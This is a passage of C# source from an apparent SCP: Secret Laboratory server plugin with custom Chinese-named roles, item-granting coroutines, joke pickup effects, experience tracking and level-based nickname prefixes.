					蕾姆.AddItem(ItemType.GrenadeFrag);
				}

			}

		}
		private IEnumerator<float> YuBoShiZB()
		{
			yield return Timing.WaitForSeconds(2f);
			鱼博士.ReferenceHub.characterClassManager.SetClassIDAdv(RoleType.Scientist, true);

			Setrank_new("Mr.Fish", "yellow", 鱼博士);

			鱼博士.Health = 120;

		}
		private IEnumerator<float> HdjjsCD()
		{
			yield return Timing.WaitForSeconds(0.1f);
			hdjjs.RemoveItem(hdjjs.CurrentItem);
			hdjjs.Broadcast(1, "<color=yelow>装弹中</color>\n5");
			yield return Timing.WaitForSeconds(1f);
			hdjjs.Broadcast(1, "<color=yelow>装弹中</color>\n4");
			yield return Timing.WaitForSeconds(1f);
			hdjjs.Broadcast(1, "<color=yelow>装弹中</color>\n3");
			yield return Timing.WaitForSeconds(1f);
			hdjjs.Broadcast(1, "<color=yelow>装弹中</color>\n2");
			yield return Timing.WaitForSeconds(1f);
			hdjjs.Broadcast(1, "<color=yelow>装弹中</color>\n1");
			yield return Timing.WaitForSeconds(1f);
			if (hdjjs != null)
			{
				hdjjs.AddItem(ItemType.GunE11SR);

			}
		}
		private IEnumerator<float> Hdjjs()
		{
			yield return Timing.WaitForSeconds(1f);
			hdjjs.ClearInventory();
			yield return Timing.WaitForSeconds(2f);
			if(hdjjs != null)
			{
				hdjjs.AddItem(ItemType.Adrenaline);
				hdjjs.AddItem(ItemType.Adrenaline);
				hdjjs.AddItem(ItemType.Medkit);
				hdjjs.AddItem(ItemType.GunE11SR);
				hdjjs.AddItem(ItemType.Flashlight);
				hdjjs.AddItem(ItemType.GunUSP);
				hdjjs.AddItem(ItemType.KeycardChaosInsurgency);
			}
			hdjjs.Broadcast(5, "你是<color=yellow>混沌狙击手</color>\n你有高额伤害但是 有五秒攻击延时");
		}
		private IEnumerator<float> SetHd(List<Player> players)
		{
			List<Player> players1 = new List<Player>();
			
			foreach(Player player in players)
            {
				if (player.Id != scp682id && !scp367id.Contains(player.Id))
				{
					players1.Add(player);

				}
			}
			yield return Timing.WaitForSeconds(2f);
			if (scp682yes)
			{
				if (scp682.Role == RoleType.ChaosInsurgency)
				{
					scp682lv++;
					if (scp682lv == 2)
					{
						scp682.Role = RoleType.Scp93953;
						Timing.RunCoroutine(Hpnew2(scp682, 2000));
						scp682.RankColor = "red";
						scp682.RankName = "SCP-682|等级2";
					}
					if (scp682lv == 3)
					{
						scp682.Role = RoleType.Scp93953;
						Timing.RunCoroutine(Hpnew2(scp682, 5000));
						scp682.RankColor = "red";
						scp682.RankName = "SCP-682|等级3";
					}
				}

			}
            try
            {
				Player 作死 = Player.Get(作死之王id);
				if (作死 != null && 作死.Role == RoleType.Spectator)
				{
					作死.Role = RoleType.NtfLieutenant;
					Setrank_new("SCP1790", "red", 作死);
				}
			}
            catch
            {

            }


			for (int i = 0; i < players1.Count(); i++)
			{
				if(players1[i].Role == RoleType.ChaosInsurgency)
                {
					if(zhgyes == false)
                    {
						zhgid = players[i].Id;
						players1[i].Broadcast(25, "<color=lime>你是指挥官</color>:\n丢弃硬币可以使用技能，只能使用一次，使用后地表\nSCP扣血1000人类50");
						Setrank_new("指挥官", "lime", players1[i]);
						Timing.RunCoroutine(Hpnew2(players1[i], 190));
						players1[i].AddItem(ItemType.Coin);
						zhgyes = true;
						continue;
					}
				}
				if (players1[i].Role == RoleType.ChaosInsurgency)
				{
					switch (times2)
					{

						case 999:
							if (七月刷出 == false)
							{
								七月 = players1[i];
								七月id = 七月.Id;
								七月刷出 = true;
								Setrank_new("SCP-七月", "red", 七月);
								Map.Broadcast(10, "七月来圈钱了");
								Timing.RunCoroutine(QiYueZB());
							}
							break;
						case 1:
							hdjjs = players[i];
							hdjjsid = players[i].Id;
							Setrank_new("混沌狙击手", "green", players1[i]);
							Coroutines.Add(Timing.RunCoroutine(Hdjjs()));
							break;

						default:
							break;
					}
					times2++;

				}
			}
		}
		private IEnumerator<float> SetNineFox(List<Player> players)
		{
			List<Player> players1 = new List<Player>();
			foreach (Player player in players)
			{
				if(player.Id != scp682id&&!scp367id.Contains(player.Id))
                {
					players1.Add(player);

				}
			}
			yield return Timing.WaitForSeconds(2f);
			if (scp682yes)
			{
				if (scp682.Team == Team.MTF)
				{
					scp682lv++;
					if (scp682lv == 2)
					{
						scp682.Role = RoleType.Scp93953;
						Timing.RunCoroutine(Hpnew2(scp682, 2000)); 
						scp682.RankColor = "red";
						scp682.RankName = "SCP-682|等级2";
					}
					if (scp682lv == 3)
					{
						scp682.Role = RoleType.Scp93953;
						Timing.RunCoroutine(Hpnew2(scp682, 5000)); 
						scp682.RankColor = "red";
						scp682.RankName = "SCP-682|等级3";

					}
				}

			}
            try
            {
				Player 作死 = Player.Get(作死之王id);
				if (作死 != null && 作死.Role == RoleType.Spectator)
				{
					作死.Role = RoleType.ChaosInsurgency;
					Setrank_new("SCP1790", "red", 作死);

				}
			}
            catch
            {

            }

			for (int i = 0; i < players1.Count(); i++)
			{
				if (players1[i].Role == RoleType.NtfCommander)
				{
					if (zhgyes == false)
					{
						zhgid = players[i].Id;
						players1[i].Broadcast(25, "<color=lime>你是指挥官</color>:\n丢弃硬币可以使用技能，只能使用一次，使用后地表\nSCP扣血1000人类50");
						Setrank_new("指挥官", "lime", players1[i]);
						Timing.RunCoroutine(Hpnew2(players1[i], 190));
						players1[i].AddItem(ItemType.Coin);
						zhgyes = true;
						continue;
					}
				}
				if (players1[i].Role == RoleType.NtfCadet)
				{
					tiems++;
					switch (tiems)
					{
						case 1:
							if (蕾姆刷出 == false)
							{
								蕾姆 = players1[i];
								蕾姆id = 蕾姆.Id;
								蕾姆刷出 = true;
								Setrank_new("蕾姆", "cyan", 蕾姆);
								Timing.RunCoroutine(LeiMuZB());
							}
							break;
						case 2:
							if (拉姆刷出 == false)
							{
								拉姆 = players1[i];
								拉姆id = 拉姆.Id;
								拉姆刷出 = true;
								Setrank_new("拉姆", "pink", 拉姆);
								Timing.RunCoroutine(LaMuZB());
							}
							break;
						case 3:
							if(爱蜜莉雅刷出 == false)
							{
								爱蜜莉雅刷出 = true;
								爱蜜莉雅 = players1[i];
								爱蜜莉雅id = 爱蜜莉雅.Id;
								Timing.RunCoroutine(AiMiLiYaZB());
							}
							break;
						case 4:
							if(寒冰刷出 == false)
							{
								寒冰 = players1[i];
								寒冰刷出 = true;
								寒冰id = 寒冰.Id;
								Timing.RunCoroutine(HanBingZB());

							}
							break;
						case 5:
							if(鱼博士刷出 == false)
							{
								鱼博士刷出 = true;
								鱼博士 = players1[i];
								鱼博士id = 鱼博士.Id;
								Timing.RunCoroutine(YuBoShiZB());
							}
							break;
						case 6:
							if (Player.Get(jwhhkid) == null)
							{
								jwhhk = players1[i];
								jwhhkid = jwhhk.Id;
								Setrank_new("九尾狐黑客", "red", jwhhk);
								jwhhk.Broadcast(5, "<color=lime>你是九尾狐黑客</color>:输入.hk可以黑入实验室");
							}
							break;
						case 7:
							scp1143id = players1[i].Id;
							Timing.RunCoroutine(GiveItemSCP1143());
							break;

						default:
							break;
					}
				}

			}
		}
		private IEnumerator<float> GiveItemSCP1143()
        {
            while(true)
			{
				yield return Timing.WaitForSeconds(10f);
				try
				{
					if (Player.Get(scp1143id).Role != RoleType.Spectator)
					{
						if (new System.Random().Next(1, 3) == 1)
						{
							Player.Get(scp1143id).AddItem(ItemType.GrenadeFlash);

						}
						else
						{
							Player.Get(scp1143id).AddItem(ItemType.GrenadeFrag);

						}

					}
                    else
                    {
						break;
                    }
				}
				catch
				{
					break;
				}
			}

        }
		private IEnumerator<float> Hkjs()
		{
			yield return Timing.WaitForSeconds(30f);
			jwhhk.ReferenceHub.characterClassManager.SetClassIDAdv(RoleType.NtfScientist, true);
			yield return Timing.WaitForSeconds(1f);
			jwhhk.Health = 120;
			jwhhk.ReferenceHub.playerMovementSync.OverridePosition(hkzb, 0, false);
			hrss = false;
		}
		public void OnTeamRespawn(RespawningTeamEventArgs ev)
		{
			if (scp367awa == false)
			{
				foreach(Player player in Player.List)
                {
					if(player.Role == RoleType.Spectator)
                    {
						if(scp682yes == false)
                        {
							if (scp367yes == false)
							{
								scp367first = player;
								scp367id.Add(player.Id);
								scp367awa = true;
								scp682awa = false;
								scp367yes = true;
								player.Role = RoleType.Scp93953;
								player.ClearBroadcasts();
								player.Broadcast(10, "你是SCP-367\n你伤害低但是你可以感染别人");
								break;
							}
						}

					}

				}

			}
			if (ev.NextKnownTeam == SpawnableTeamType.ChaosInsurgency)
			{
				times2 = 1;
				Coroutines.Add(Timing.RunCoroutine(SetHd(ev.Players)));
			}
			if (ev.NextKnownTeam == SpawnableTeamType.NineTailedFox)
			{
				tiems = 0;
				Coroutines.Add(Timing.RunCoroutine(SetNineFox(ev.Players)));

			}

		}
		public void OnPickUpItem(PickingUpItemEventArgs ev)
		{
			if(ev.Player.Id == scp738id)
            {
				if(scp738fuzhi)
                {
					if(new System.Random().Next(1,100) >= 60)
                    {
						ev.Player.ShowHint("复制失败");
						ev.Player.Health -= 40;
                    }
                    else
                    {
						if(ev.Pickup.ItemId == ItemType.KeycardO5)
                        {
							ev.Player.AddItem(ItemType.KeycardO5);
							ev.Player.Health -= 50;
                        }
						else if (ev.Pickup.ItemId.IsKeycard())
						{
							ev.Player.AddItem(ev.Pickup.ItemId);
							ev.Player.Health -= 30;
						}
						else if(ev.Pickup.ItemId == ItemType.GunUSP)
                        {
							ev.Player.AddItem(ev.Pickup.ItemId);
							ev.Player.Health -= 60;
						}
						else if (ev.Pickup.ItemId == ItemType.Medkit)
						{
							ev.Player.AddItem(ev.Pickup.ItemId);
							ev.Player.Health -= 45;
						}

					}
					if (ev.Player.Health <= 0)
					{
						ev.Player.Kill(DamageTypes.Nuke);
					}
				}
            }
			if(ev.Player.Id == 莱月昂id)
            {
				if(ev.Pickup.itemId==ItemType.Coin)
                {
					ev.IsAllowed = false;
					ev.Pickup.Delete();
                }
            }
			if(ev.Player.Id == 亚伯id)
			{
				if(ev.Pickup.ItemId == ItemType.GunCOM15)
				{
					ev.IsAllowed = false;
				}
				if (ev.Pickup.ItemId == ItemType.GunE11SR)
				{
					ev.IsAllowed = false;
				}
				if (ev.Pickup.ItemId == ItemType.GunLogicer)
				{
					ev.IsAllowed = false;
				}
				if (ev.Pickup.ItemId == ItemType.MicroHID)
				{
					ev.IsAllowed = false;
				}
				if (ev.Pickup.ItemId == ItemType.GunMP7)
				{
					ev.IsAllowed = false;
				}
			}
			if (ev.Player.Id == hdjjsid && ev.Pickup.ItemId == ItemType.GunE11SR)
			{
				ev.IsAllowed = false;
			}
			if(ev.Player.Id == 黑暗掌控者id || ev.Player.Id == 亚伯id)
			{
				if(ev.Pickup.itemId == ItemType.Coin)
				{
					ev.IsAllowed = false;
					ev.Pickup.Delete();
				}
			}
			
			if (Baba.Contains(ev.Pickup) && ev.Player.Id != 黑暗掌控者id&& ev.Player.Id != 亚伯id)
			{
				Baba.Remove(ev.Pickup);
				ev.IsAllowed = false;
				ev.Pickup.Delete();
				int time = new System.Random().Next(1, 100);
				if(time>= 1 && time <= 5)
				{
					ev.Player.Broadcast(5, "一日三餐没烦恼，就吃老八秘制小汉堡，既实惠还管饱");
					ev.Player.Health = ev.Player.MaxHealth;
				}
				if (time >= 6 && time <= 10)
				{
					ev.Player.Broadcast(5, "美食界里我老八，今天吃个哈密瓜，往里倒点臭卤虾，万人称我美食家");
					ev.Player.AddItem(ItemType.GunLogicer);
					ev.Player.AddItem(ItemType.MicroHID);
				}
				if (time >= 11 && time <= 23)
				{
					ev.Player.Broadcast(5, "都说面条吃不饱，就怪配料没放好，臭豆腐腐乳黄瓜丝，迟到嘴里美汁er汁er");
					ev.Player.AddItem(ItemType.SCP207);
					ev.Player.AddItem(ItemType.Adrenaline);
					ev.Player.AdrenalineHealth = 30;
				}
				if (time >= 24 && time <= 38)
				{
					ev.Player.Broadcast(5, "腐乳豆腐拌香蕉，简简单单的夜宵，不管是香还是臭，到我嘴里都是肉");
					ev.Player.AdrenalineHealth = 20;
				}
				if (time >= 39 && time <= 47)
				{
					ev.Player.Broadcast(5, "美食界里我老八，今天吃个大扒鸭，要问扒鸭哪里好，扒鸭屁股是块宝");
					foreach(Player player in Player.List)
					{
						if(player.Role == RoleType.Scp173)
						{
							ev.Player.Position = player.Position;
						}
					}
				}
				if (time >= 48 && time <= 55)
				{
					ev.Player.Broadcast(5, "老铁们啊，尝不到苦辣，永远不知道酸甜，今天老八挑战一把酸甜苦辣咸，奥利给，干了兄弟们！");
					foreach(Player player in Player.List)
					{
						if(player.Team == Team.SCP)
						{
							ev.Player.Position = player.Position;
							break;
						}
					}
				}
				if (time >= 56 && time <= 74)
				{
					ev.Player.Broadcast(5, "不管是香还是臭，到我嘴里都是肉！");
					ev.Player.Health += 30;
					int awa = new System.Random().Next(1, 6);
					switch (awa)
					{
						case 1:
							ev.Player.AddItem(ItemType.Adrenaline);
							break;
						case 2:
							ev.Player.AddItem(ItemType.GunCOM15);
							break;
						case 3:
							ev.Player.AddItem(ItemType.GunE11SR);
							break;
						case 4:
							ev.Player.AddItem(ItemType.GunLogicer);
							break;
						case 5:
							ev.Player.AddItem(ItemType.KeycardFacilityManager);
							break;
					}
				}
				if (time >= 75 && time <= 85)
				{
					ev.Player.Broadcast(5, "俘虏！");
					if(ev.Player.Team == Team.MTF)
					{
						ev.Player.Role = RoleType.ChaosInsurgency;
					}
					if (ev.Player.Team == Team.CHI)
					{
						ev.Player.Role = RoleType.NtfLieutenant;
					}
					if (ev.Player.Role == RoleType.ClassD)
					{
						ev.Player.Role = RoleType.NtfLieutenant;
					}
					if (ev.Player.Role == RoleType.Scientist)
					{
						ev.Player.Role = RoleType.ChaosInsurgency;
					}
				}
				if (time >= 86 && time <= 100)
				{
					ev.Player.Broadcast(5, "美汁er汁er！");
					ev.Player.Health = ev.Player.MaxHealth;
					ev.Player.AddItem(ItemType.SCP207);
					ev.Player.AddItem(ItemType.SCP018);
					ev.Player.AddItem(ItemType.GunLogicer);
					ev.Player.AddItem(ItemType.Adrenaline);
					ev.Player.AddItem(ItemType.KeycardO5);
				}
			}
			if (Baba1.Contains(ev.Pickup))
			{
				if(!第一次.Contains(ev.Player.Id))
				{
					第一次.Add(ev.Player.Id);
					ev.Player.Broadcast(10, "老铁们啊，只有你们想不到的，没有老八做不到的。还是那句话，今天我老八挑战一把吃粑粑。兄弟们，奥利给！干了！");
					ev.Player.Health -= 80;
				}
				else if (第一次.Contains(ev.Player.Id) && !第二次.Contains(ev.Player.Id))
				{
					第二次.Add(ev.Player.Id);
					ev.Player.Broadcast(10, "老铁们啊，虽然不是同一时间，但是同一个厕所。老八我再次挑战一把吃粑粑，奥利给！干了！兄弟们！");
					ev.Player.Health -= 99;
				}
				else if(第二次.Contains(ev.Player.Id))
				{
					ev.Player.Broadcast(10, "老铁们啊，还是那句话，只有你们想不到的，没有老八做不到的。你们不要笑我狼狈不堪，我也可以笑你离开你的父母比我吃屎都难。奥利给！干了！兄弟们！");
					ev.Player.Health -= 999999;
				}
				if(ev.Player.Health <= 0)
				{
					ev.Player.Kill();
					ev.Player.Role = RoleType.Spectator;
				}
			}
			if (ev.Player.Id == 蕾姆id || ev.Player.Id == 拉姆id)
			{
				ev.IsAllowed = false;
			}
			if(ev.Pickup.itemId == ItemType.GunUSP)
			{
				if (scp2818pickup == false)
				{
					scp2818pickup = true;
					scp2818id = ev.Player.Id;
					Map.Broadcast(5, "SCP2818已被捡起");
				}
			}
		}
		private IEnumerator<float> QiYueCD()
		{
			yield return Timing.WaitForSeconds(15f);
			七月技能发动 = false;
		}
		private IEnumerator<float> LaMuCD()
		{
			yield return Timing.WaitForSeconds(30f);
			拉姆之怒 = false;

		}
		private IEnumerator<float> LeiMuCD()
		{
			yield return Timing.WaitForSeconds(30f);
			蕾姆之怒 = false;
		}
		private IEnumerator<float> XTHD()
		{
			yield return Timing.WaitForSeconds(1200f);
			xthdyes = true;
			Warhead.Start();
		}
		private IEnumerator<float> CaiYueAngFuHuo()
		{
			yield return Timing.WaitForSeconds(15f);
			莱月昂.ReferenceHub.characterClassManager.SetClassIDAdv(RoleType.ClassD,true);
			莱月昂.Position = new Vector3(莱月昂坐标.x , 莱月昂坐标.y+ (float)1.2, 莱月昂坐标.z);
			foreach(Inventory.SyncItemInfo syncItemInfo in 莱月昂装备)
			{
				莱月昂.AddItem(syncItemInfo.id);
			}

		}
		private IEnumerator<float> scp008ganran(Player player,Vector3 vector3)
        {
			yield return Timing.WaitForSeconds(1f);
			player.Role = RoleType.Scp0492;
			yield return Timing.WaitForSeconds(1f);
			player.Position = vector3;
		}
		public void ONWarheadCancelled(StoppingEventArgs ev)
		{
			if(xthdyes)
			{
				ev.IsAllowed = false;
			}
		}
		public void Shot(ShootingEventArgs ev)
		{
			if (ev.Shooter.Id == hdjjsid && ev.Shooter.CurrentItem.id == ItemType.GunE11SR)
			{
				Coroutines.Add(Timing.RunCoroutine(HdjjsCD()));

			}
		}

		public void OnPlayerDeath(DiedEventArgs ev)
		{
			if(ev.Target.Role == RoleType.ClassD || ev.Target.Role == RoleType.Scientist)
            {
				IniFile.AddExp(ev.Killer.UserId, 10);
				ev.Killer.ShowHint("恭喜你获得10点经验，当前经验" + IniFile.ReadExp(ev.Killer.UserId), 4);
            }
			if (ev.Target.Role == RoleType.ChaosInsurgency || ev.Target.Role == RoleType.NtfCadet)
			{
				IniFile.AddExp(ev.Killer.UserId, 15);
				ev.Killer.ShowHint("恭喜你获得15点经验，当前经验" + IniFile.ReadExp(ev.Killer.UserId), 4);
			}
			if (ev.Target.Role == RoleType.NtfCommander || ev.Target.Role == RoleType.NtfLieutenant)
			{
				IniFile.AddExp(ev.Killer.UserId, 20);
				ev.Killer.ShowHint("恭喜你获得20点经验，当前经验" + IniFile.ReadExp(ev.Killer.UserId), 4);
			}
			if (ev.Target.Team == Team.SCP)
			{
				IniFile.AddExp(ev.Killer.UserId, 20);
				ev.Killer.ShowHint("恭喜你获得20点经验，当前经验" + IniFile.ReadExp(ev.Killer.UserId), 4);
			}
			if (ev.Target.Id == 保安队长id)
            {
				保安队长id = 0;
				Setrank_new("", "white", ev.Target);

			}
			if(scp367id.Contains(ev.Target.Id))
            {
				Setrank_new("", "white", ev.Target);
				scp367id.Remove(ev.Target.Id);
			}
			if (ev.Target.Id == Dioid)
            {
				Dio = null;
				Setrank_new("", "white", ev.Target);
				Dioid = 0;
			}
			if(ev.Target.Id == scp105id)
            {
				scp105id = 0;
				scp105 = null;
				Setrank_new("", "white", ev.Target);
				Exiled.API.Features.Map.Broadcast(6, "----[<color=#32CD32>SCP105</color>]----\n<color=#FF0000>[收容成功]</color>\n收容者: <color=#40E0D0>" + ev.Killer.Nickname + "</color>");
				scp105flash = false; 
			}
			if(ev.Target.Id == zhgid)
            {
				zhgid = 0;
				Setrank_new("", "white", ev.Target);

			}
			if (ev.Target.Id == jwhhkid)
			{
				jwhhkid = 0;
				jwhhk = null;
				Setrank_new("", "white", ev.Target);
			}
			if (ev.Target.Id == scp738id)
            {
				scp738id = 0;
				scp738fuzhi = false;
				Exiled.API.Features.Map.Broadcast(6, "----[<color=#32CD32>scp738</color>]----\n<color=#FF0000>[收容成功]</color>\n收容者: <color=#40E0D0>" + ev.Killer.Nickname + "</color>");
				Setrank_new("", "", ev.Target);

			}
			if (scp008id.Contains(ev.Target.Id))
            {
				scp008lastpos = ev.Target.Position;
				scp008id.Remove(ev.Target.Id);
				ev.Target.RankColor = "";
				ev.Target.RankName = "";
				foreach(Player player in Player.List)
                {
					
					if (player.Id != 亚伯id && player.Id != scp035id && player.Id != 黑暗掌控者id)
                    {
						if (player.Team != Team.SCP && Vector3.Distance(player.Position, ev.Target.Position) <= 8)
						{

							Timing.RunCoroutine(scp008ganran(player, player.Position));

							player.Kill(DamageTypes.Nuke);

						}
					}

                }
            }
			if(ev.Target.Id == 亚伯id)
			{
				亚伯 = null;
				Setrank_new("", "white", ev.Target);
				亚伯id = 0;
				Exiled.API.Features.Map.Broadcast(6, "----[<color=#32CD32>SCP550</color>]----\n<color=#FF0000>[收容成功]</color>\n收容者: <color=#40E0D0>" + ev.Killer.Nickname + "</color>");

			}
			if (ev.Target.Id == 黑暗掌控者id)
			{
				黑暗掌控者 = null;
				黑暗掌控者id = 0;
				Setrank_new("", "white", ev.Target);
				黑暗掌控者yes = false;
				Exiled.API.Features.Map.Broadcast(6, "----[<color=#32CD32>SCP134</color>]----\n<color=#FF0000>[收容成功]</color>\n收容者: <color=#40E0D0>" + ev.Killer.Nickname + "</color>");

			}
			if (ev.Target.Id == scp1038id)
			{
				scp1038id = 0;
				Setrank_new("", "white", ev.Target);
				scp1038 = null;
				Exiled.API.Features.Map.Broadcast(6, "----[<color=#32CD32>SCP1038</color>]----\n<color=#FF0000>[收容成功]</color>\n收容者: <color=#40E0D0>" + ev.Killer.Nickname + "</color>");

			}
			if (ev.Target.Id == scp457id)
			{
				scp457 = null;
				scp457a = false;
				scp457die = true;
				Setrank_new("", "white", ev.Target);
				Cassie.Message("S C P 4 5 7 CONTAINEDSUCCESSFULLY");
				scp457id = 0;
				Exiled.API.Features.Map.Broadcast(6, "----[<color=#32CD32>SCP457</color>]----\n<color=#FF0000>[收容成功]</color>\n收容者: <color=#40E0D0>" + ev.Killer.Nickname + "</color>");
			}
			if (ev.Target.Id == hdjjsid)
			{
				hdjjs = null;
				hdjjsid = 0;
				Setrank_new("", "white", ev.Target);

			}
			if (ev.Target.Id == scp3199id)
			{
				Exiled.API.Features.Map.Broadcast(6, "----[<color=#32CD32>[SCP3199]</color>]----\n<color=#FF0000>[收容成功]</color>\n收容者: <color=#40E0D0>" + ev.Killer.Nickname + "</color>");
				Setrank_new("", "", ev.Target);

			}
			if (蛇之手id.Contains(ev.Target.Id))
			{
				蛇之手id.Remove(ev.Target.Id);
				Setrank_new("", "", ev.Target);

			}
			if(ev.Killer.Id == scp035id)
			{
				Setrank_new("SCP-035", "red", ev.Killer);

			}
			if (ev.Target.Id == 蛇皮手id)
			{
				蛇皮手id = 0;
				蛇皮手间谍 = null;
				Setrank_new("", "", ev.Target);
			}
			if(ev.Killer.Id == 蛇皮手id)
			{
				Setrank_new("蛇皮手间谍", "yellow", ev.Killer);

			}
			if (ev.Target.Id == 鱼博士id)
			{
				鱼博士 = null;
				鱼博士乘坐 = false;
				鱼博士id = 0;
				鱼博士刷出 = false;
				Setrank_new("", "", ev.Target);
			}
			if (ev.Target.Id == scp682id)
			{

				if(scp682lv == 3)
                {
					scp682 = null;
					scp682id = 0;
					scp682yes = false;
					scp682lv = 1;
					Exiled.API.Features.Map.Broadcast(6, "----[<color=#32CD32>[SCP682]</color>]----\n<color=#FF0000>[收容成功]</color>\n收容者: <color=#40E0D0>" + ev.Killer.Nickname + "</color>");
					Setrank_new("", "", ev.Target);
				}


			}
			if (ev.Target.Id  == Dioid)
			{
				Dio = null;
				Setrank_new("", "", ev.Target);
				Dioid = 0;
			}
			if(ev.Target.Id == 寒冰id)
			{
				寒冰 = null;
				Setrank_new("", "", ev.Target);
				寒冰id = 0;
			}
			if(ev.Target.Id == scp035id)
			{
				scp035id = 0;
				Setrank_new("", "", ev.Target);
				Exiled.API.Features.Map.Broadcast(6, "----[<color=#32CD32>[SCP035]</color>]----\n<color=#FF0000>[收容成功]</color>\n收容者: <color=#40E0D0>" + ev.Killer.Nickname + "</color>");
			}
			if(ev.Target.Id == scp999id)
			{
				Setrank_new("", "", ev.Target);
				scp999id = 0;
				Exiled.API.Features.Map.Broadcast(6, "----[<color=#32CD32>[SCP999]</color>]----\n<color=#FF0000>[收容成功]</color>\n收容者: <color=#40E0D0>" + ev.Killer.Nickname + "</color>");
			}
			if (ev.Target.Id == 幸运儿id)
			{
				幸运儿 = null;
				幸运儿id = 0;
				Exiled.API.Features.Map.Broadcast(6, "----[<color=#32CD32>[SCP181]</color>]----\n<color=#FF0000>[收容成功]</color>\n收容者: <color=#40E0D0>" + ev.Killer.Nickname + "</color>");
				Setrank_new("", "", ev.Target);

			}
			if (ev.Target.Id == 莱月昂id)
			{
				莱月昂复活次数++;
				if(莱月昂复活次数 <= 4)
				{
					Timing.RunCoroutine(CaiYueAngFuHuo());
				}
				else
				{
					Exiled.API.Features.Map.Broadcast(6, "----[<color=#32CD32>[莱月昂]</color>]----\n<color=#FF0000>[收容成功]</color>\n收容者: <color=#40E0D0>" + ev.Killer.Nickname + "</color>");
					莱月昂 = null;
					莱月昂id = 0;
					莱月昂坐标 = new Vector3();
					莱月昂复活次数 = 0;
					莱月昂装备 = null;
					莱月昂角色 = RoleType.ClassD;
					莱月昂刷出 = false;
					莱月昂之怒 = false;
				}
			}
			if(ev.Target.Id == 精灵id)
			{
				Setrank_new("", "", ev.Target);
				精灵 = null;
				精灵id = 0;
			}
			if (ev.Target.Id == 爱蜜莉雅id)
			{
				爱蜜莉雅 = null;
				爱蜜莉雅id = 0;
				爱蜜莉雅刷出 = false;
				Setrank_new("", "", ev.Target);
				Exiled.API.Features.Map.Broadcast(6, "----[<color=#32CD32>[爱蜜莉雅]</color>]----\n<color=#FF0000>[收容成功]</color>\n收容者: <color=#40E0D0>" + ev.Killer.Nickname + "</color>");

			}
			if (ev.Target.Id == 张大仙id)
			{
				Setrank_new("", "", ev.Target);
				张大仙id = 0;
				Exiled.API.Features.Map.Broadcast(6, "----[<color=#32CD32>[张大仙]</color>]----\n<color=#FF0000>[收容成功]</color>\n收容者: <color=#40E0D0>" + ev.Killer.Nickname + "</color>");
			}
			if (ev.Target.Id == scp2818id)
			{
				scp2818id = 0;
			}
			if(ev.Target.Id == 七月id)
			{
				七月 = null;
				七月id = 0;
				七月刷出 = false;
				七月技能发动 = false;
				Setrank_new("", "", ev.Target);
				Exiled.API.Features.Map.Broadcast(6, "----[<color=#32CD32>[七月]</color>]----\n<color=#FF0000>[收容成功]</color>\n收容者: <color=#40E0D0>"+ev.Killer.Nickname+"</color>");
			}
			if(ev.Target.Id == 蕾姆id)
			{
				蕾姆 = null;
				蕾姆id = 0;
				蕾姆刷出 = false;
				Setrank_new("", "", ev.Target);
				Exiled.API.Features.Map.Broadcast(6, "<color=#3399FF>" + "雷姆已死亡" + "</color>");

				if (拉姆刷出)
				{
					拉姆之怒 = true;
					Timing.RunCoroutine(LaMuCD());
					拉姆.AddItem(ItemType.Coin);
				}
				if(莱月昂刷出)
				{
					莱月昂之怒 = true;
					莱月昂.Health = 333;
					莱月昂.AddItem(ItemType.SCP207);
				}
			}
			if (ev.Target.Id == 拉姆id)
			{
				拉姆 = null;
				拉姆id = 0;
				Exiled.API.Features.Map.Broadcast(6, "<color=pink>" + "拉姆已死亡" + "</color>");

				拉姆刷出 = false;
				Setrank_new("", "", ev.Target);
				if(蕾姆刷出)
				{
					蕾姆之怒 = true;
					Timing.RunCoroutine(LeiMuCD());
					蕾姆.AddItem(ItemType.Coin);
				}
				if (莱月昂刷出)
				{
					莱月昂之怒 = true;
					莱月昂.Health = 333;
					莱月昂.AddItem(ItemType.SCP207);
				}
			}
		}
		private IEnumerator<float> SecondCounter22()
		{
			while (scp457a)
			{
				if (scp457.Role == RoleType.Tutorial)
				{
					foreach (Exiled.API.Features.Player player in Exiled.API.Features.Player.List)
					{
						if (player.Team != 0 && player.Id != scp457id && Vector3.Distance(scp457.Position, player.Position) <= 6)
						{
							int sh = 4 + 2 * scp457sh;
							player.Health -= sh;
							player.ClearBroadcasts();
							player.Broadcast(1, "<color=red>[你感到自己火了]</color>");
						}
					}
				}
				yield return Timing.WaitForSeconds(1f);
			}
		}
		public void OnRoundStart()
		{
			Server.FriendlyFire = true;
			Coroutines.Add(Timing.RunCoroutine(XTHD()));
			Coroutines.Add(Timing.RunCoroutine(RenWuFenPei()));
			Coroutines.Add(Timing.RunCoroutine(JianCe()));
			roundstart = true;
		}
		private IEnumerator<float> Scp457tp()
		{
			yield return Timing.WaitForSeconds(1f);
			scp457.Position = RoleType.Scp096.GetRandomSpawnPoint();
			yield return Timing.WaitForSeconds(0.5f);
			scp457.Position = RoleType.Scp096.GetRandomSpawnPoint();
		}
		public static void setnick(ReferenceHub hub)
		{
			int exp = IniFile.ReadExp(hub.characterClassManager.UserId);
			int Lv = IniFile.ReadLevel(exp);
			hub.nicknameSync.Network_displayName = "[Lv." + Lv.ToString() + "]" + hub.nicknameSync.Network_myNickSync;
			if (!hub.serverRoles.GlobalSet)
			{
				if (Lv >= 10 && Lv < 20)
				{
					hub.nicknameSync.Network_displayName = "[Lv." + Lv.ToString() + " Re:0萌新]" + hub.nicknameSync.Network_myNickSync;

				}
				if (Lv >= 20 && Lv < 30)
				{
					hub.nicknameSync.Network_displayName = "[Lv." + Lv.ToString() + " Re:0萌新]" + hub.nicknameSync.Network_myNickSync;

				}
				if (Lv >= 30 && Lv < 45)
				{
					hub.nicknameSync.Network_displayName = "[Lv." + Lv.ToString() + " Re:0强者]" + hub.nicknameSync.Network_myNickSync;

				}
				if (Lv >= 45 && Lv < 50)
				{
					hub.nicknameSync.Network_displayName = "[Lv." + Lv.ToString() + " Re:0强者]" + hub.nicknameSync.Network_myNickSync;

				}
				if (Lv >= 50 && Lv < 60)
				{
					hub.nicknameSync.Network_displayName = "[Lv." + Lv.ToString() + " Re:0老玩家]" + hub.nicknameSync.Network_myNickSync;

				}
				if (Lv >= 60)
				{
					hub.nicknameSync.Network_displayName = "[Lv." + Lv.ToString() + " Re0:荣誉玩家]" + hub.nicknameSync.Network_myNickSync;

				}
			}

		}
		public static void setnick(ReferenceHub hub, int exp)
		{
			int Lv = IniFile.ReadLevel(exp);
			hub.nicknameSync.Network_displayName = "[Lv." + Lv.ToString() + "]" + hub.nicknameSync.Network_myNickSync;
			if (!hub.serverRoles.GlobalSet)
            {
				if (Lv >= 10 && Lv < 20)
				{
